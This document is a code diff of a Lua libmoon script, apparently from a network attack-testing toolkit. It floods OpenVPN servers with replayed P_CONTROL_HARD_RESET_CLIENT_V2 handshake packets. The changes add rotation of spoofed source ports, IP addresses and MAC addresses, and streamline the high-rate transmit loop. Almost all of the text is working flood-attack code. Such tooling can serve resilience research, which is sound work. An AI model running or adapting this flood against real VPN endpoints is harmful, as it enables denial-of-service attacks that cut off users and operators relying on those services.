@@ -2,19 +2,12 @@
 local lm = require "libmoon"
 local log = require "log"
 local memory = require "memory"
-local stats = require "stats"
 local pcap = require "pcap"
-local arp = require "proto.arp"
-local eth = require "proto.ethernet"
-local pcap = require "pcap"
-local ns = require "namespaces"
-
-local openvpn = require "proto.openvpn"
 
 local attack = require "attack"
+local fieldModifier = require "fieldModifier"
 
 local ffi = require "ffi"
-local format = string.format
 
 local PKT_LEN = 60
 
@@ -22,7 +15,9 @@ local PKT_LEN = 60
 function configure(parser)
 	attack.configure_pars(parser)
 	parser:description("OpenVPN.")
-	parser:option("--flows", "Number of flows to be used. Requries udpSrc (to define the first port)."):args(1):convert(tonumber):default(1)
+	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
+	parser:option("--ipFlows", "Number of flows used in the flood by using different source IP addresses. Max 255"):args(1):convert(tonumber):default(1)
+	parser:option("--ethFlows", "Number of flows used in the flood by using different source ethernet addresses. Max 255"):args(1):convert(tonumber):default(1)
 	parser:option("--pchrcv2Pcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file."):args(1)
 	parser:option("--pchrcv2TlsAuthPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-auth."):args(1)
 	parser:option("--pchrcv2TlsCryptPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-crypt."):args(1)
@@ -32,9 +27,12 @@ function configure(parser)
 end
 
 master = attack.main
-rxTask = attack.rxTask
+
+local taskRunning = attack.taskRunning
+local createPkt
 
 function txTask(threadId, queue, args)
+	log:info("Start txTask.")
 
 	local slowRate = false
 	local lastSent = 0
@@ -42,38 +40,55 @@ function txTask(threadId, queue, args)
 		slowRate = args.queueRate
 	end
 
-
 	local mempool = memory:createMemPool()
 	local bufs = mempool:bufArray()
 
-	local flowCounter = 0
-	local pkts = createPkts(args, mempool)
+	local pktPrototype, pktLen = createPkt(args, mempool)
+
+	local udpSrcModifier
+	if args.flows and not (args.flows == 1) then
+		udpSrcModifier = fieldModifier.field_inc.udpSrc((args.flows))
+	end
+
+	local ipSrcModifier
+	if args.ipFlows and not (args.ipFlows == 1) then
+		ipSrcModifier = fieldModifier.field_inc.ipSrc_3(args.ipFlows)
+	end
+
+	local ethSrcModifier
+	if args.ethFlows and not (args.ethFlows == 1) then
+		ethSrcModifier = fieldModifier.field_inc.ethSrc_5(args.ethFlows)
+	end
 
 	attack.txTask_sync_start(args)
 
-	while lm.running() do -- check if Ctrl+c was pressed
+	while taskRunning(args) do -- check if Ctrl+c was pressed
 		if slowRate then
-			bufs:allocN(400, 1)
+			bufs:allocN(pktLen, 1)
 		else
-			bufs:alloc(400)
+			bufs:alloc(pktLen)
 		end
 		local sizeSum = 0
 
 		for i, buf in ipairs(bufs) do
-
-			local pkt = buf:getRawPacket()
-			ffi.copy(pkt, pkts[flowCounter + 1].pkt, pkts[flowCounter + 1].size)
-			flowCounter = (flowCounter + 1) % (args.flows or 1)
-
-			buf:setSize(pkts[flowCounter + 1].size)
+			local pkt = buf:getUdpPacket()
+			ffi.copy(pkt, pktPrototype, pktLen)
 
 			sizeSum = sizeSum + buf:getSize()
 
-			attack.txTask_setChecksumOffloading(buf, args)
-
-			if captureCtr then
-				captureCtr:countPacket(buf)
+			if udpSrcModifier then
+				udpSrcModifier:set_field(pkt)
 			end
+			
+			if ipSrcModifier then
+				ipSrcModifier:set_field(pkt)
+			end
+
+			if ethSrcModifier then
+				ethSrcModifier:set_field(pkt)
+			end
+
+			attack.txTask_setChecksumOffloading(buf, args)
 		end
 
 		if slowRate then
@@ -85,41 +100,21 @@ function txTask(threadId, queue, args)
 			end
 			lastSent = now
 		end
-
 		attack.txTask_send(queue, bufs)
-
-		if captureCtr then
-			captureCtr:update()
-		end
-	
-	end
-
-	if captureCtr then
-		captureCtr:finalize()
 	end
 
 	log:info("Terminate txTask.")
 end
 
 function createPkt(args, mempool)
-	mempool = mempool or memory:createMemPool()
-
-	local bufArray = mempool:bufArray()
 
 	local pcapFile = args.pchrcv2Pcap or args.pchrcv2TlsAuthPcap or args.pchrcv2TlsCryptPcap  or args.pchrcv3TlsCryptV2Pcap
 
-	if pcapFile then
-		local pcapReader = pcap:newReader(pcapFile)
-		local n = pcapReader:read(bufArray)
-		if n == 0 then
-			pcapReader:reset()
-		end
-		pcapReader:close()
+	local pcapReader = pcap:newReader(pcapFile)
+	local buf = pcapReader:readSingle(mempool)
 
-		attack.modifyPacket(bufArray[1], args)
-	end
+	attack.modifyPkt(buf, args)
 
-	local buf = bufArray[1]
 	local pkt = buf:getRawPacket()
 
 	local pktLength = buf.pkt_len
@@ -128,28 +123,8 @@ function createPkt(args, mempool)
 	local res = ffi.new("uint8_t [?]", pktLength)
 	ffi.copy(res, pkt, pktLength)
 
-	bufArray:freeAll()
+	buf:free()
+	pcapReader:close()
 
 	return res, pktLength
-end
-
-function createPkts(args, mempool)
-	mempool = mempool or memory:createMemPool()
-
-	local pkts = {}
-
-	if args.flows then
-		local argsUdpSrc = args.udpSrc
-		for i = 1, args.flows do
-			args.udpSrc = argsUdpSrc + (i - 1)
-			local pkt, size = createPkt(args, mempool)
-			pkts[i] = {pkt=pkt, size= size}
-		end
-		args.udpSrc = argsUdpSrc
-	else
-		local pkt, size = createPkt(args, mempool)
-		pkts[1] = {pkt=pkt, size= size}
-	end
-
-	return pkts
 end
